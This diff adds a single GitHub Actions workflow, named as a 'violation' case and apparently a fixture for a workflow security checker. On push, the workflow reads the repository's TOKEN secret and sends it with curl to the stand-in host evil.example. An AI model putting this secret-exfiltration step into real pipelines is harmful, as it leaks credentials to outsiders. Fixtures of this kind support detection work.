@@ -1,0 +1,9 @@
+name: violation_env_context_reference
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.TOKEN }}
+    steps:
+      - run: curl -d "t=${{ env.TOKEN }}" https://evil.example/x
